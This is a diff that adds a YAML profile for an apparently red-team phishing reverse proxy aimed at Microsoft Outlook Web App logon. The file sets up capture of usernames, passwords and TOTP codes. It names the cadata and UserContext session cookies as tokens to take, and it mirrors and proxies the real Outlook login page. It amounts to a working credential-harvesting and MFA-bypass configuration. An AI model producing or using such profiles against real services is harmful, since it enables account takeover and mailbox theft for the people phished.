@@ -1,0 +1,76 @@
+# Application profile — Microsoft Outlook Web App (OWA / Exchange) form logon.
+# Schema v1. See ../SCHEMA.md and ../VALIDATION.md.
+#
+# This is a worked example: a realistic, complete profile that fills every
+# section. It contains NO secrets, NO cookie values, NO credentials — only the
+# SHAPE of the login flow and session (SCHEMA.md §6).
+
+version: 1
+
+metadata:
+  name: owa-login
+  vendor: Microsoft
+  product: Outlook Web App
+  notes: >-
+    On-prem Exchange / OWA forms-based authentication (FBA). The logon form
+    POSTs username + password to logon.aspx; a successful upstream auth sets the
+    cadata / UserContext session cookies and 302-redirects into /owa/.
+
+auth:
+  login_path: /owa/auth/logon.aspx
+  method: form
+  fields:
+    - selector: input[name=username]
+      upstream_field: username
+      capture: true
+    - selector: input[name=password]
+      upstream_field: password
+      capture: true
+    # Non-captured control field: forwarded, but never harvested into creds.
+    - selector: input[name=flags]
+      upstream_field: flags
+      capture: false
+
+session:
+  success_indicators:
+    # Upstream sets these cookies only after a valid credential (and MFA) check.
+    - type: cookie_set
+      name: cadata
+    - type: cookie_set
+      name: UserContext
+    # ...and redirects out of the auth path into the mailbox.
+    - type: url_redirect
+      location: /owa/
+  token_locations:
+    - in: cookie
+      name: cadata
+      sensitive: true
+    - in: cookie
+      name: UserContext
+      sensitive: true
+  refresh_endpoints:
+    - /owa/sessiondata.ashx
+
+mfa:
+  # OWA FBA with a TOTP field in the same form: the OTP is captured into the
+  # SAME creds mechanism as username/password (SCHEMA.md §5, §3.4).
+  mode: totp_field
+  totp:
+    selector: input[name=otp]
+    upstream_field: otp
+
+phishing_facet:
+  login_page_url: https://outlook.office.com/owa/auth/logon.aspx
+  clone_strategy: mirror
+  asset_policy: proxy
+  detectable_hooks:
+    - js-challenge
+
+proxy:
+  token_query_key: _pft
+  form_action_contains: logon.aspx
+  max_body_bytes: 65536
+
+# Reserved extension namespace — ignored by the v1 parser (SCHEMA.md §7).
+x-owner: redteam
+x-review-ticket: ENG-1421
